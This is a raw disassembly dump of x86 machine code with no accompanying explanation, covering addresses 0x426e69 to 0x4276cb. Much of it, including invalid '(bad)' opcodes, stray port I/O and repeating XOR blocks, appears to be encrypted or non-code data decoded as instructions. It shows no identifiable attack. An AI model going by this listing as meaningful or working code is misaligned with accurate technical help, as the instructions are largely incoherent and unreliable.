  426e69:	arpl   bp,di
  426e6b:	or     DWORD PTR [edi+0x56],ecx
  426e6e:	lea    ecx,[ebp-0x37287f73]
  426e74:	jl     0x426eed
  426e76:	scas   eax,DWORD PTR es:[edi]
  426e77:	fst    DWORD PTR [edi-0x21]
  426e7a:	adc    DWORD PTR [esi-0x7a],ebx
  426e7d:	pop    DWORD PTR [ebx+0x26]
  426e80:	push   eax
  426e81:	ja     0x426e7a
  426e83:	push   eax
  426e84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e85:	jp     0x426ed7
  426e87:	ja     0x426e0b
  426e89:	xor    BYTE PTR [edi+0x7a],0x80
  426e8d:	lock or BYTE PTR [ecx],0x46
  426e91:	std    
  426e92:	or     al,0xb2
  426e94:	mov    esi,0x7af0800c
  426e99:	adc    BYTE PTR [edi+0x537c5382],0x72
  426ea0:	push   edi
  426ea2:	stos   BYTE PTR es:[edi],al
  426ea3:	dec    ebp
  426ea4:	xlat   BYTE PTR ds:[ebx]
  426ea5:	xor    eax,0x4d29bab2
  426eaa:	loopne 0x426ee2
  426eac:	cmp    cl,BYTE PTR [ebp-0x7b817973]
  426eb2:	dec    ebp
  426eb3:	dec    ebp
  426eb4:	xor    BYTE PTR [edi+0x7a],0x80
  426eb8:	lock or BYTE PTR [ecx],0x46
  426ebc:	std    
  426ebd:	or     al,0xb2
  426ebf:	mov    esi,0x7af0800c
  426ec4:	adc    BYTE PTR [edi+0x537c5382],0x72
  426ecb:	push   edi
  426ecd:	stos   BYTE PTR es:[edi],al
  426ece:	dec    ebp
  426ecf:	loopne 0x426f07
  426ed1:	cmp    cl,BYTE PTR [ebp+0x29bab28d]
  426ed7:	dec    ebp
  426ed8:	loopne 0x426f08
  426eda:	cmp    cl,BYTE PTR [ebp-0x7bc17973]
  426ee0:	dec    ebp
  426ee1:	dec    ebp
  426ee2:	or     BYTE PTR [esi+esi*1+0x3a],0x8d
  426ee7:	lea    eax,[eax+0x657f80ef]
  426eed:	in     al,dx
  426eee:	out    dx,eax
  426eef:	push   eax
  426ef0:	lock out dx,eax
  426ef2:	xor    al,0xaf
  426ef5:	xor    BYTE PTR [edi-0x9],0x9
  426ef9:	inc    esi
  426efa:	mov    dl,0xc
  426efc:	mov    dl,0x86
  426efe:	or     al,0x80
  426f00:	ja     0x426eb1
  426f02:	adc    BYTE PTR [edi-0x4dd5ac09],0x84
  426f09:	sub    DWORD PTR [ebx+0x6a],edx
  426f0c:	push   DWORD PTR [edx+0x9eff080]
  426f12:	pop    esp
  426f13:	jg     0x426f2e
  426f15:	dec    edi
  426f16:	std    
  426f17:	aad    0x21
  426f19:	or     BYTE PTR [edx+eax*4+0x3a],0x8d
  426f1e:	lea    edi,[ebp+ecx*4-0xb]
  426f22:	and    al,0x6f
  426f24:	cmp    BYTE PTR [eax+0x77802177],al
  426f2a:	jno    0x426f79
  426f2c:	xlat   BYTE PTR ds:[ebx]
  426f2d:	cmp    eax,0x4dc8d74d
  426f32:	xlat   BYTE PTR ds:[ebx]
  426f33:	sub    eax,0x4d25d74d
  426f38:	xlat   BYTE PTR ds:[ebx]
  426f39:	sbb    eax,0x8615d74d
  426f3e:	cmp    cl,al
  426f40:	dec    ebp
  426f41:	dec    ebp
  426f42:	push   eax
  426f43:	dec    edi
  426f44:	xor    cl,BYTE PTR ds:0x77804d4d
  426f4a:	cmp    eax,0x8d15dded
  426f4f:	aad    0x1b
  426f51:	xor    BYTE PTR [edi+0x3d],0xed
  426f55:	frstor ds:0x80a1d58d
  426f5b:	dec    edi
  426f5c:	xor    cl,BYTE PTR ds:0xf0804d4d
  426f62:	cmp    eax,0xc41d9250
  426f67:	dec    DWORD PTR [ebp-0x29]
  426f6a:	cmp    eax,0x86c8d74d
  426f6f:	mov    WORD PTR [edx+0x4d],gs
  426f72:	dec    ebp
  426f73:	stos   DWORD PTR es:[edi],eax
  426f74:	test   eax,0x35fb70a3
  426f79:	lea    edx,[edi-0x78127880]
  426f7f:	and    DWORD PTR [ecx-0x9748884],ebx
  426f85:	and    al,0x6f
  426f87:	cmp    BYTE PTR [edi+esi*2-0x38],bh
  426f8b:	cmc    
  426f8c:	and    al,0x6f
  426f8e:	cmp    BYTE PTR [eax-0x287f7489],al
  426f94:	mov    esp,edx
  426f96:	or     eax,0x6f242260
  426f9b:	cmp    BYTE PTR [ebx-0x4e],dl
  426f9e:	scas   al,BYTE PTR es:[edi]
  426f9f:	push   ebx
  426fa0:	ret    0x86b2
  426fa3:	or     al,0xb2
  426fa5:	add    ch,BYTE PTR [ecx]
  426fa7:	(bad)  
  426fa8:	cld    
  426fa9:	adc    bh,0xef
  426fac:	arpl   WORD PTR [edx],si
  426fae:	xor    BYTE PTR [edi-0x75],0x9
  426fb2:	sete   BYTE PTR [ebp-0x287f7273]
  426fb9:	mov    edx,DWORD PTR [ebx-0x4e]
  426fbc:	push   ebx
  426fbd:	ret    0x2b2
  426fc0:	sub    DWORD PTR [edx-0x300f37a],esi
  426fc6:	adc    bh,0x21
  426fc9:	arpl   WORD PTR [edx],si
  426fcb:	or     DWORD PTR [edi],ecx
  426fcd:	loopne 0x426f5c
  426fcf:	lea    ecx,[ebp-0x7f8e8880]
  426fd5:	xchg   edi,eax
  426fd6:	and    DWORD PTR [eax+0x539befd7],eax
  426fdc:	dec    ebp
  426fdd:	push   eax
  426fde:	ja     0x426f6b
  426fe0:	dec    edi
  426fe1:	jb     0x426fec
  426fe3:	cmovb  ecx,DWORD PTR [ebp-0x706c7273]
  426fea:	out    dx,al
  426feb:	pop    ebx
  426fec:	adc    BYTE PTR [edi+0x9],dh
  426fef:	cld    
  426ff0:	ja     0x42703f
  426ff2:	aad    0xfc
  426ff4:	ja     0x427009
  426ff6:	sbb    esp,edi
  426ff8:	ja     0x426ff9
  426ffa:	ror    BYTE PTR [ecx],1
  426ffc:	loopne 0x427075
  426ffe:	dec    DWORD PTR [ecx]
  427000:	loopne 0x426fa9
  427002:	adc    ecx,edi
  427004:	jp     0x426f93
  427006:	lea    ecx,[ebp-0x1ff68bcd]
  42700c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42700d:	dec    ebp
  42700e:	xor    esi,DWORD PTR [eax+edx*1+0x77]
  427012:	mov    bh,ah
  427014:	ja     0x426fe2
  427016:	or     eax,0xd40d77fc
  42701b:	cld    
  42701c:	ja     0x42706b
  42701e:	jl     0x42701c
  427020:	ja     0x427035
  427022:	sar    esp,cl
  427024:	ja     0x427025
  427026:	push   esp
  427027:	(bad)  
  427028:	ja     0x427029
  42702a:	(bad)  
  42702b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42702c:	adc    esp,DWORD PTR [esi+0x4da78f74]
  427032:	shl    BYTE PTR [edi+ecx*4-0x59],cl
  427036:	or     eax,0xa78fc40b
  42703b:	int3   
  42703c:	shl    BYTE PTR [edi+ecx*4-0x59],cl
  427040:	mov    dl,dh
  427042:	sbb    bl,0x35
  427045:	in     eax,dx
  427046:	out    0x8b,eax
  427048:	lea    ecx,[ecx]
  42704a:	loopne 0x4270c3
  42704c:	or     edi,edx
  42704e:	or     DWORD PTR [edi-0x33],edx
  427051:	lea    ecx,[ebp-0x72e1d073]
  427057:	lea    ecx,[ebp-0x3bf688f0]
  42705d:	inc    DWORD PTR [edi+0x8]
  427060:	lea    ecx,[ebp+0x977108d]
  427066:	div    eax
  427068:	or     DWORD PTR [edi-0x11eff689],ecx
  42706e:	pop    ebx
  42706f:	jnp    0x4270d4
  427071:	test   DWORD PTR [ecx],ecx
  427073:	jmp    0x80a3:0x4d4d4d9e
  42707a:	ja     0x427044
  42707c:	push   ebx
  42707d:	mov    dl,0x80
  42707f:	lock enter 0x5ed,0xd
  427084:	stos   DWORD PTR es:[edi],eax
  427085:	les    esp,FWORD PTR [esi+0x538b7780]
  42708b:	mov    dl,0x80
  42708d:	lock mov edx,DWORD PTR [ebx-0x2]
  427091:	mov    dl,0xba
  427093:	sub    DWORD PTR [edx-0x4d00f37a],esi
  427099:	test   eax,0x8d21fb70
  42709e:	xchg   edi,eax
  42709f:	add    BYTE PTR [edi+0x7cc587ed],0x77
  4270a6:	mov    dh,dh
  4270a8:	and    al,0x6f
  4270aa:	cmp    cl,dh
  4270ac:	cmc    
  4270ad:	and    al,0x6f
  4270af:	cmp    BYTE PTR [eax-0x69],dl
  4270b2:	mov    eax,DWORD PTR [eax+0x77501577]
  4270b8:	adc    eax,0x80157780
  4270bd:	int    0x2e
  4270bf:	cmp    cl,BYTE PTR [ebp+0x15f0808d]
  4270c5:	or     BYTE PTR [ebp+0x3a2e5080],0x8d
  4270cc:	lea    eax,[eax+0x657dec30]
  4270d2:	xchg   ebx,eax
  4270d3:	push   eax
  4270d4:	lock stc 
  4270d6:	xor    BYTE PTR [edi-0x76],0x80
  4270da:	lock mov bl,BYTE PTR [ecx+0x10de29b]
  4270e1:	out    0x2f,al
  4270e3:	push   ebx
  4270e4:	jl     0x427098
  4270e6:	xchg   BYTE PTR [ebx+eiz*4],cl
  4270e9:	push   ebx
  4270ea:	adc    DWORD PTR [edx-0x4d00d646],esi
  4270f0:	push   eax
  4270f1:	ja     0x427075
  4270f3:	xor    BYTE PTR [edi-0x76],0x80
  4270f7:	lock mov dl,BYTE PTR [ebx+0x7c]
  4270fb:	mov    dl,0x86
  4270fd:	or     al,0x53
  4270ff:	adc    DWORD PTR [edx-0x4d00d646],esi
  427105:	push   eax
  427106:	ja     0x42708c
  427108:	xor    BYTE PTR [edi-0x7],0x80
  42710c:	ins    DWORD PTR es:[edi],dx
  42710d:	or     ch,ch
  42710f:	xchg   BYTE PTR [ecx],ah
  427111:	push   eax
  427112:	ja     0x42710b
  427114:	xor    BYTE PTR [edi-0x7],0x80
  427118:	ins    DWORD PTR es:[edi],dx
  427119:	pop    ebp
  42711a:	xor    al,0xf9
  42711d:	jge    0x42716e
  42711f:	xchg   edx,eax
  427120:	xchg   ebp,eax
  427121:	xor    BYTE PTR [edi-0x7],0xd5
  427125:	sbb    eax,0x805d6d80
  42712a:	lock stc 
  42712c:	cmp    BYTE PTR [edi-0x6b],0x7d
  427130:	dec    ebx
  427131:	div    DWORD PTR [ebx]
  427133:	std    
  427134:	xor    BYTE PTR [edi-0x7],0x80
  427138:	ins    DWORD PTR es:[edi],dx
  427139:	pop    ebp
  42713a:	in     al,dx
  42713b:	mov    dl,0xc4
  42713d:	in     al,dx
  42713e:	sub    BYTE PTR [ebp-0x6b],0x50
  427142:	ja     0x4270ca
  427144:	xor    BYTE PTR [edi-0x76],0x80
  427148:	lock mov dl,BYTE PTR [ebx+0x7c]
  42714c:	push   ebx
  42714d:	adc    DWORD PTR [edx-0x454df37a],esi
  427153:	sub    edi,edi
  427155:	mov    dl,0x50
  427157:	ja     0x42716e
  427159:	xor    BYTE PTR [edi-0x76],0x80
  42715d:	lock mov dl,BYTE PTR [ebx+0x7c]
  427161:	push   ebx
  427162:	adc    DWORD PTR [edx-0x794dd646],esi
  427168:	or     al,0xff
  42716a:	mov    dl,0x50
  42716c:	ja     0x427183
  42716e:	xor    BYTE PTR [edi-0x76],0x80
  427172:	lock mov dl,BYTE PTR [ebx+0x11]
  427176:	push   ebx
  427177:	jl     0x42712b
  427179:	mov    edx,0xc86b229
  42717e:	push   DWORD PTR [edx+0x5071f080]
  427184:	cmp    dl,BYTE PTR [eax-0x69]
  427187:	adc    eax,0xf415777c
  42718c:	and    al,0x6f
  42718e:	cmp    BYTE PTR [edi+esi*2+0x15],bh
  427192:	repz and al,0x6f
  427195:	cmp    BYTE PTR [edi+esi*2+0x15],bh
  427199:	cli    
  42719a:	and    al,0x6f
  42719c:	cmp    BYTE PTR [esi-0x727290c9],bh
  4271a2:	xor    BYTE PTR [edi-0x76],0x80
  4271a6:	lock mov dl,BYTE PTR [ebx+0x7c]
  4271aa:	push   ebx
  4271ab:	adc    DWORD PTR [edx-0x454df37a],esi
  4271b1:	sub    edi,edi
  4271b3:	mov    dl,0x50
  4271b5:	ja     0x42713b
  4271b7:	xor    BYTE PTR [edi-0x7a],0xec
  4271bb:	ja     0x4271de
  4271bd:	push   eax
  4271be:	ja     0x427142
  4271c0:	dec    ebp
  4271c1:	xlat   BYTE PTR ds:[ebx]
  4271c2:	or     BYTE PTR [ebp-0x29],0x21
  4271c6:	xor    al,0xf9
  4271c9:	xchg   BYTE PTR [ecx+0x504d4da8],cl
  4271cf:	ja     0x4271e6
  4271d1:	xor    BYTE PTR [edi+0x15],0x4f
  4271d5:	push   0xffffffd5
  4271d7:	(bad)  
  4271d8:	xor    BYTE PTR [edi-0x7e],0x50
  4271dc:	ja     0x427161
  4271de:	xor    BYTE PTR [edi-0x7d],0x80
  4271e2:	lock and DWORD PTR [ebx-0x4e],eax
  4271e6:	push   eax
  4271e7:	ja     0x42716c
  4271e9:	xor    BYTE PTR [edi+0x15],0x80
  4271ed:	lock adc eax,0xec716d80
  4271f3:	xchg   edx,eax
  4271f4:	and    DWORD PTR [eax-0x29c7c10],eax
  4271fa:	in     al,0x19
  4271fc:	xor    BYTE PTR [edi+0x15],0x80
  427200:	ins    DWORD PTR es:[edi],dx
  427201:	and    DWORD PTR [eax-0x6d13ea10],eax
  427207:	out    dx,eax
  427208:	xor    al,0x83
  42720b:	inc    ebx
  42720c:	mov    dl,0xbe
  42720e:	and    ch,BYTE PTR [edi]
  427210:	lea    ecx,[ebp+0x6f24f6fa]
  427216:	cmp    BYTE PTR [eax-0x29],dl
  427219:	scas   eax,DWORD PTR es:[edi]
  42721a:	jl     0x427293
  42721c:	std    
  42721d:	cmc    
  42721e:	and    al,0x6f
  427220:	cmp    BYTE PTR [edi+esi*2+0x76],bh
  427224:	hlt    
  427225:	and    al,0x6f
  427227:	cmp    BYTE PTR [edi+esi*2+0x6a],bh
  42722b:	repz and al,0x6f
  42722e:	cmp    BYTE PTR [ecx],al
  427230:	ja     0x4271e1
  427232:	push   eax
  427233:	ja     0x4271fd
  427235:	add    DWORD PTR [edi-0x3],esi
  427238:	push   eax
  427239:	ja     0x42726d
  42723b:	add    DWORD PTR [edi+0x76],esi
  42723e:	push   eax
  42723f:	ja     0x427256
  427241:	add    DWORD PTR [edi+0x6a],esi
  427244:	push   eax
  427245:	ja     0x4271ce
  427247:	xor    BYTE PTR [edi-0x76],0x80
  42724b:	lock mov dl,BYTE PTR [ebx+0x7c]
  42724f:	push   ebx
  427250:	adc    DWORD PTR [edx-0x454df37a],esi
  427256:	sub    edi,edi
  427258:	mov    dl,0x50
  42725a:	ja     0x4271df
  42725c:	mov    esi,0x8d8decfe
  427261:	mov    ds:0x6f24f30d,al
  427266:	cmp    BYTE PTR [ecx],cl
  427268:	shld   esp,ebp,0x8d
  42726c:	(bad)  
  42726d:	loop   0x427290
  42726f:	dec    ebp
  427270:	xlat   BYTE PTR ds:[ebx]
  427271:	add    BYTE PTR [ecx],0x77
  427274:	bound  ecx,QWORD PTR [edx]
  427276:	xchg   BYTE PTR [ecx],cl
  427278:	test   al,0x4d
  42727a:	dec    ebp
  42727b:	xor    BYTE PTR [edi-0x75],0x80
  42727f:	lock mov edx,DWORD PTR [ebx+0x7c]
  427283:	push   ebx
  427284:	adc    DWORD PTR [edx-0x794dd646],esi
  42728a:	or     al,0xff
  42728c:	mov    dl,0x50
  42728e:	ja     0x427214
  427290:	push   eax
  427291:	xlat   BYTE PTR ds:[ebx]
  427292:	jp     0x427302
  427294:	out    0x7a,eax
  427296:	xor    BYTE PTR [edi+0x7a],0xb2
  42729a:	xchg   BYTE PTR [ebx+edx*2],cl
  42729d:	(bad)  
  42729e:	mov    dl,0x2
  4272a0:	sub    edi,edi
  4272a2:	xor    dl,BYTE PTR [eax-0x29]
  4272a5:	add    DWORD PTR [eax-0xf7f7489],0xffffff8b
  4272ac:	push   ebx
  4272ad:	adc    DWORD PTR [edx+0x7c5329ba],esi
  4272b3:	mov    dl,0x86
  4272b5:	or     al,0xff
  4272b7:	mov    dl,0x80
  4272b9:	lock mov eax,DWORD PTR [eax+0x2a538b97]
  4272c0:	push   ebx
  4272c1:	xchg   esp,eax
  4272c2:	mov    dl,0xbe
  4272c4:	or     al,0xb2
  4272c6:	clc    
  4272c7:	sub    edi,edi
  4272c9:	(bad)  
  4272ca:	in     al,dx
  4272cb:	mov    dl,0x80
  4272cd:	lock adc DWORD PTR [eax-0x29],0x66
  4272d2:	arpl   bp,di
  4272d4:	xlat   BYTE PTR ds:[ebx]
  4272d5:	sub    DWORD PTR [eax-0xf7f7489],eax
  4272db:	mov    edx,DWORD PTR [ebx+0x7c]
  4272de:	push   ebx
  4272df:	adc    DWORD PTR [edx-0x454df37a],esi
  4272e5:	sub    edi,edi
  4272e7:	mov    dl,0xa
  4272e9:	loop   0x42730c
  4272eb:	add    DWORD PTR [edi+0x62],esi
  4272ee:	or     al,BYTE PTR [esi+0x4d4d8a4c]
  4272f4:	xor    BYTE PTR [edi-0x76],0x80
  4272f8:	lock mov dl,BYTE PTR [ebx+0x7c]
  4272fc:	push   ebx
  4272fd:	adc    DWORD PTR [edx-0x794dd646],esi
  427303:	or     al,0xff
  427305:	mov    dl,0x80
  427307:	lock and DWORD PTR [ebx-0x3],0xffffffd5
  42730c:	sub    DWORD PTR [eax-0xf7f7589],eax
  427312:	mov    dl,BYTE PTR [ebx+0x7c]
  427315:	push   ebx
  427316:	adc    DWORD PTR [edx-0x454df37a],esi
  42731c:	sub    edi,edi
  42731e:	mov    dl,0xa
  427320:	loop   0x427343
  427322:	add    DWORD PTR [edi+0x62],esi
  427325:	or     al,BYTE PTR [esi+0x4d4d8ac9]
  42732b:	xor    BYTE PTR [edi-0x38],0x80
  42732f:	lock enter 0x3080,0x80
  427334:	lea    edx,[ebx+0x11]
  427337:	push   ebx
  427338:	jl     0x4272ec
  42733a:	mov    edx,0xc86b229
  42733f:	push   DWORD PTR [edx+0x622f758f]
  427345:	xor    al,0x8a
  427348:	adc    BYTE PTR [edi+0x532a538a],0x94
  42734f:	mov    dl,0xbe
  427351:	or     al,0xb2
  427353:	clc    
  427354:	sub    DWORD PTR [ecx],ecx
  427356:	loopne 0x4273c2
  427358:	(bad)  
  427359:	(bad)  
  42735a:	arpl   WORD PTR [edx+0xca20f09],si
  427360:	lea    ecx,[ebp-0x7fcd8880]
  427366:	lock xor al,BYTE PTR [eax+0x538d8030]
  42736d:	adc    DWORD PTR [ebx+0x7c],edx
  427370:	mov    dl,0xba
  427372:	sub    DWORD PTR [edx-0x4d00f37a],esi
  427378:	(bad)  
  427379:	jne    0x4273aa
  42737b:	bound  eax,QWORD PTR [eax-0x687f7510]
  427381:	mov    dl,BYTE PTR [ebx+0x2a]
  427384:	push   ebx
  427385:	xchg   esp,eax
  427386:	mov    dl,0xbe
  427388:	or     al,0xb2
  42738a:	clc    
  42738b:	sub    DWORD PTR [ecx],ecx
  42738d:	loopne 0x4273f9
  42738f:	(bad)  
  427390:	(bad)  
  427391:	arpl   WORD PTR [edx+0xcda0f09],si
  427397:	lea    ecx,[ebp-0x7fea8880]
  42739d:	lock adc eax,0x8d803080
  4273a3:	push   ebx
  4273a4:	adc    DWORD PTR [ebx+0x7c],edx
  4273a7:	mov    dl,0xba
  4273a9:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4273af:	(bad)  
  4273b0:	jne    0x4273e1
  4273b2:	bound  eax,QWORD PTR [eax-0x687f7510]
  4273b8:	mov    dl,BYTE PTR [ebx+0x2a]
  4273bb:	push   ebx
  4273bc:	xchg   esp,eax
  4273bd:	mov    dl,0xbe
  4273bf:	or     al,0xb2
  4273c1:	clc    
  4273c2:	sub    DWORD PTR [ecx],ecx
  4273c4:	loopne 0x427430
  4273c6:	(bad)  
  4273c7:	(bad)  
  4273c8:	arpl   WORD PTR [edx+0xc130f09],si
  4273ce:	lea    ecx,[ebp-0x7f788880]
  4273d4:	lock xchg DWORD PTR [eax+0x538d8030],eax
  4273db:	adc    DWORD PTR [ebx+0x7c],edx
  4273de:	mov    dl,0xba
  4273e0:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4273e6:	(bad)  
  4273e7:	jne    0x427418
  4273e9:	bound  eax,QWORD PTR [eax-0x687f7510]
  4273ef:	mov    dl,BYTE PTR [ebx+0x2a]
  4273f2:	push   ebx
  4273f3:	xchg   esp,eax
  4273f4:	mov    dl,0xbe
  4273f6:	or     al,0xb2
  4273f8:	clc    
  4273f9:	sub    DWORD PTR [ecx],ecx
  4273fb:	loopne 0x427467
  4273fd:	(bad)  
  4273fe:	(bad)  
  4273ff:	arpl   WORD PTR [edx+0x3a830f09],si
  427405:	lea    ecx,[ebp-0x7fcd8880]
  42740b:	lock xor al,BYTE PTR [eax+0x538d8030]
  427412:	adc    DWORD PTR [edx+0x7c5329ba],esi
  427418:	mov    dl,0x86
  42741a:	or     al,0xff
  42741c:	mov    dl,0x8f
  42741e:	jne    0x42744f
  427420:	bound  eax,QWORD PTR [eax+0x3080c8f0]
  427426:	adc    BYTE PTR [edi+0x539080c8],0x2a
  42742d:	mov    dl,0xbe
  42742f:	or     al,0x53
  427431:	xchg   esp,eax
  427432:	mov    dl,0xf8
  427434:	sub    edi,edi
  427436:	dec    BYTE PTR [edi-0x2b9d30cf]
  42743c:	mov    dl,0x80
  42743e:	lock adc eax,0x97803080
  427444:	adc    eax,0x2a539080
  427449:	mov    dl,0xbe
  42744b:	or     al,0x53
  42744d:	xchg   esp,eax
  42744e:	mov    dl,0xf8
  427450:	sub    edi,edi
  427452:	dec    BYTE PTR [edi-0x599d30cf]
  427458:	mov    dl,0x80
  42745a:	lock enter 0x3080,0x80
  42745f:	xchg   edi,eax
  427460:	enter  0x9080,0x53
  427464:	sub    dl,BYTE PTR [ebx-0x6c]
  427467:	mov    dl,0xbe
  427469:	or     al,0xb2
  42746b:	clc    
  42746c:	sub    edi,edi
  42746e:	dec    BYTE PTR [edi-0x29a930cf]
  427474:	std    
  427475:	or     DWORD PTR [edi-0x43],ecx
  427478:	cmp    cl,BYTE PTR [ebp+0x1577808d]
  42747e:	xor    al,0x15
  427481:	xor    BYTE PTR [eax],0x80
  427484:	lea    edx,[ebx+0x11]
  427487:	mov    dl,0xba
  427489:	sub    DWORD PTR [ebx+0x7c],edx
  42748c:	mov    dl,0x86
  42748e:	or     al,0xff
  427490:	mov    dl,0x8f
  427492:	jne    0x4274c3
  427494:	bound  eax,QWORD PTR [eax+0x308032f0]
  42749a:	adc    BYTE PTR [edi+0x53908032],0x2a
  4274a1:	mov    dl,0xbe
  4274a3:	or     al,0x53
  4274a5:	xchg   esp,eax
  4274a6:	mov    dl,0xf8
  4274a8:	sub    edi,edi
  4274aa:	dec    BYTE PTR [edi-0x2b9d30cf]
  4274b0:	mov    dl,0x80
  4274b2:	lock xchg DWORD PTR [eax-0x78687fd0],eax
  4274b9:	adc    BYTE PTR [eax-0x414dd5ad],0xc
  4274c0:	push   ebx
  4274c1:	xchg   esp,eax
  4274c2:	mov    dl,0xf8
  4274c4:	sub    edi,edi
  4274c6:	dec    BYTE PTR [edi-0x599d30cf]
  4274cc:	mov    dl,0x80
  4274ce:	lock xor al,BYTE PTR [eax+0x32978030]
  4274d5:	adc    BYTE PTR [eax-0x6bacd5ad],0xb2
  4274dc:	mov    esi,0x29f8b20c
  4274e1:	(bad)  
  4274e2:	dec    BYTE PTR [edi-0x29a930cf]
  4274e8:	std    
  4274e9:	or     DWORD PTR [edi-0x38],ecx
  4274ec:	lea    ecx,[ebp-0x78887f73]
  4274f2:	xor    al,0x87
  4274f5:	xor    BYTE PTR [eax],0x80
  4274f8:	lea    edx,[ebx+0x11]
  4274fb:	mov    dl,0xba
  4274fd:	sub    DWORD PTR [ebx+0x7c],edx
  427500:	mov    dl,0x86
  427502:	or     al,0xff
  427504:	mov    dl,0x8f
  427506:	jne    0x427537
  427508:	bound  eax,QWORD PTR [eax+0x308015f0]
  42750e:	adc    BYTE PTR [edi+0x53908015],0x2a
  427515:	mov    dl,0xbe
  427517:	or     al,0x53
  427519:	xchg   esp,eax
  42751a:	mov    dl,0xf8
  42751c:	sub    edi,edi
  42751e:	dec    BYTE PTR [edi-0x2b9d30cf]
  427524:	mov    dl,0x80
  427526:	lock enter 0x3080,0x80
  42752b:	xchg   edi,eax
  42752c:	enter  0x9080,0x53
  427530:	sub    dh,BYTE PTR [edx-0x6bacf342]
  427536:	mov    dl,0xf8
  427538:	sub    edi,edi
  42753a:	dec    BYTE PTR [edi-0x599d30cf]
  427540:	mov    dl,0x80
  427542:	lock adc eax,0x97803080
  427548:	adc    eax,0x2a539080
  42754d:	push   ebx
  42754e:	xchg   esp,eax
  42754f:	mov    dl,0xbe
  427551:	or     al,0xb2
  427553:	clc    
  427554:	sub    edi,edi
  427556:	dec    BYTE PTR [edi-0x29a930cf]
  42755c:	std    
  42755d:	or     DWORD PTR [edi-0x33],ecx
  427560:	lea    ecx,[ebp-0x78887f73]
  427566:	xor    al,0x87
  427569:	xor    BYTE PTR [eax],0x80
  42756c:	lea    edx,[ebx+0x11]
  42756f:	mov    dl,0xba
  427571:	sub    DWORD PTR [ebx+0x7c],edx
  427574:	mov    dl,0x86
  427576:	or     al,0xff
  427578:	mov    dl,0x8f
  42757a:	jne    0x4275ab
  42757c:	bound  eax,QWORD PTR [eax+0x3080c8f0]
  427582:	adc    BYTE PTR [edi+0x539080c8],0x2a
  427589:	mov    dl,0xbe
  42758b:	or     al,0x53
  42758d:	xchg   esp,eax
  42758e:	mov    dl,0xf8
  427590:	sub    edi,edi
  427592:	dec    BYTE PTR [edi-0x2b9d30cf]
  427598:	mov    dl,0x80
  42759a:	lock xor al,BYTE PTR [eax+0x32978030]
  4275a1:	adc    BYTE PTR [eax-0x414dd5ad],0xc
  4275a8:	push   ebx
  4275a9:	xchg   esp,eax
  4275aa:	mov    dl,0xf8
  4275ac:	sub    edi,edi
  4275ae:	dec    BYTE PTR [edi-0x599d30cf]
  4275b4:	mov    dl,0x80
  4275b6:	lock xchg DWORD PTR [eax-0x78687fd0],eax
  4275bd:	adc    BYTE PTR [eax-0x6bacd5ad],0xb2
  4275c4:	mov    esi,0x29f8b20c
  4275c9:	(bad)  
  4275ca:	dec    BYTE PTR [edi-0x29a930cf]
  4275d0:	std    
  4275d1:	xlat   BYTE PTR ds:[ebx]
  4275d2:	jno    0x4275d5
  4275d4:	ja     0x427638
  4275d6:	or     al,BYTE PTR [esi+0x4d4dac84]
  4275dc:	xor    al,0x5e
  4275df:	arpl   WORD PTR [edx+0x778017d5],si
  4275e5:	mov    al,BYTE PTR [eax+0x11538af0]
  4275eb:	push   ebx
  4275ec:	jl     0x4275a0
  4275ee:	mov    edx,0xc86b229
  4275f3:	push   DWORD PTR [edx-0x7f7b88b0]
  4275f9:	ja     0x427586
  4275fb:	adc    bh,0x8b
  4275fe:	xor    BYTE PTR [edi-0x75],0x80
  427602:	lock mov edx,DWORD PTR [ebx+0x4b]
  427606:	push   ebx
  427607:	je     0x4275bb
  427609:	mov    BYTE PTR [edx+esi*4],cl
  42760c:	test   BYTE PTR [ecx],ch
  42760e:	push   DWORD PTR [edx]
  427610:	in     al,dx
  427611:	xlat   BYTE PTR ds:[ebx]
  427612:	data16 xor BYTE PTR [edi+0x7a],0x53
  427617:	sub    ch,ch
  427619:	mov    edx,0x8a84ed8a
  42761e:	mov    dl,0x88
  427620:	sub    esp,ebp
  427622:	std    
  427623:	inc    DWORD PTR ds:0x24f60ba2
  427629:	outs   dx,DWORD PTR ds:[esi]
  42762a:	cmp    BYTE PTR [eax-0xf7f7589],al
  427630:	mov    dl,BYTE PTR [ebx+0x11]
  427633:	push   ebx
  427634:	jl     0x4275e8
  427636:	mov    edx,0xc86b229
  42763b:	push   DWORD PTR [edx+0x6384f080]
  427641:	std    
  427642:	or     DWORD PTR [edi],ecx
  427644:	pop    ds
  427645:	mov    cl,BYTE PTR [ebp+0x4d]
  427648:	xor    BYTE PTR [edi-0x76],0x80
  42764c:	lock mov dl,BYTE PTR [ebx+0x7c]
  427650:	push   ebx
  427651:	adc    DWORD PTR [edx-0x794dd646],esi
  427657:	or     al,0xff
  427659:	mov    dl,0x80
  42765b:	lock test BYTE PTR [ebx-0x3],ah
  42765f:	xlat   BYTE PTR ds:[ebx]
  427660:	sbb    eax,DWORD PTR [eax-0xf7f7489]
  427666:	mov    edx,DWORD PTR [ebx+0x7c]
  427669:	push   ebx
  42766a:	adc    DWORD PTR [edx-0x454df37a],esi
  427670:	sub    edi,edi
  427672:	mov    dl,0xbe
  427674:	jg     0x4276b0
  427676:	lea    ecx,[ebp-0x6656da1e]
  42767c:	dec    ebp
  42767d:	xlat   BYTE PTR ds:[ebx]
  42767e:	add    BYTE PTR [ecx],0x77
  427681:	push   ss
  427682:	or     al,BYTE PTR [esi+0x4d4da00c]
  427688:	xor    BYTE PTR [edi-0x76],0x80
  42768c:	lock mov dl,BYTE PTR [ebx+0x7c]
  427690:	push   ebx
  427691:	adc    DWORD PTR [edx-0x794dd646],esi
  427697:	or     al,0xff
  427699:	mov    dl,0x80
  42769b:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  4276a0:	xchg   ebx,eax
  4276a1:	xor    BYTE PTR [edi-0x75],0x80
  4276a5:	lock mov edx,DWORD PTR [ebx+0x7c]
  4276a9:	push   ebx
  4276aa:	adc    DWORD PTR [edx-0x794dd646],esi
  4276b0:	or     al,0xff
  4276b2:	mov    dl,0x80
  4276b4:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  4276b9:	daa    
  4276ba:	xor    BYTE PTR [edi-0x75],0x80
  4276be:	lock mov edx,DWORD PTR [ebx+0x7c]
  4276c2:	push   ebx
  4276c3:	adc    DWORD PTR [edx-0x454df37a],esi
  4276c9:	sub    edi,edi
  4276cb:	mov    dl,0xa
